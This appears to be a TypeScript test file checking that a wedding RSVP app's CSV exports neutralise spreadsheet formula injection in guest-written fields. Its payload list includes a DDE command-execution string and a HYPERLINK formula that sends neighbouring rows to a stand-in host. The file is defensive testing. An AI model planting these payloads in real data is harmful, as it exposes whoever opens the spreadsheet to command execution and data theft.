import { describe, expect, it } from 'vitest';
import { needsToCsv, overviewToCsv } from '@/capabilities/rsvp/admin_rsvp';

/**
 * Guests write `dietary`, `accessibility` and their plus-one's name themselves, and those columns go
 * straight into the file the couple and the caterer open in a spreadsheet. Every payload below was
 * measured reaching the download unneutralised before this guard existed.
 */
const DANGEROUS = [
  "=cmd|'/c calc'!A1", // DDE command execution on older Excel
  '=HYPERLINK("https://evil.test/?d="&A2,"Menu details")', // one click exfiltrates the neighbouring rows
  '-2+3',
  '+1+1',
  '@SUM(1,1)',
  '\tleading tab',
];

const needsRow = (dietary: string) => ({ guestId: 'g1', displayName: 'Ada Testhouse', householdName: 'Testhouse household', dietary, accessibility: null });

describe('CSV exports never hand a spreadsheet a live formula', () => {
  it.each(DANGEROUS)('neutralises %j in the needs export', (payload) => {
    const cell = needsToCsv([needsRow(payload)]).split('\r\n')[1]!;
    // The apostrophe must come before the payload, inside the quotes when the cell is quoted.
    expect(cell).toMatch(/(^|,)"?'/);
    expect(cell).not.toMatch(/(^|,)"?[=+\-@\t\r]/);
  });

  it('leaves ordinary text exactly as the guest wrote it', () => {
    const cell = needsToCsv([needsRow('No shellfish, please')]).split('\r\n')[1]!;
    expect(cell).toContain('"No shellfish, please"');
    expect(cell).not.toContain("'No shellfish");
  });

  it('neutralises a plus-one name in the overview export', () => {
    const csv = overviewToCsv({
      rows: [{
        householdName: 'Testhouse household', displayName: 'Ada Testhouse', eventName: 'Reception', status: 'accepted',
        mealLabel: 'Beef', mealStale: false, plusOne: { attending: true, name: '=1+1', mealLabel: null }, updatedAt: null, submittedVia: null,
      }],
    } as Parameters<typeof overviewToCsv>[0]);
    expect(csv).toContain("'=1+1");
    expect(csv).not.toMatch(/,=1\+1/);
  });
});
